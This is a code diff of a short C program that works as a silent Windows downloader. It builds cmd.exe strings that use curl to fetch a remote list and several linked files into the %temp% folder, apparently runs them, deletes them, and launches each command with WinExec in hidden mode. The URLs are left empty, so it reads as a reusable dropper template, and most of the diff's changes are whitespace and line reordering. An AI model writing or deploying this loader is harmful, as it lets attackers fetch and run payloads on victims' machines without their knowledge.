@@ -4,13 +4,13 @@
 char *links[] = {
     "",
 };
-char *installFolder = "%temp%\\";
 char *remoteLink = "";
+char *installFolder = "%temp%\\";
 
 int main()
 {
-
     char cmd[] = "cmd.exe /c @echo off && for /F \"delims=\" %i in ('curl -s ";
+
     strcat(cmd, remoteLink);
     strcat(cmd, "') do (");
     strcat(cmd, "for %a in (\"%i\") do (");
@@ -22,12 +22,14 @@ int main()
     strcat(cmd, installFolder);
     strcat(cmd, "%~NXa");
     strcat(cmd, "))");
+
     WinExec(cmd, SW_HIDE);
 
     for (int i = 0; i < sizeof(links); i++)
     {
         char *fileName = strrchr(links[i], '/') + 1;
         char cmd[] = "cmd.exe /c @echo off && curl ";
+        
         strcat(cmd, links[i]);
         strcat(cmd, " -s -o ");
         strcat(cmd, installFolder);
@@ -38,6 +40,7 @@ int main()
         strcat(cmd, " && del ");
         strcat(cmd, installFolder);
         strcat(cmd, fileName);
+        
         WinExec(cmd, SW_HIDE);
     }
 
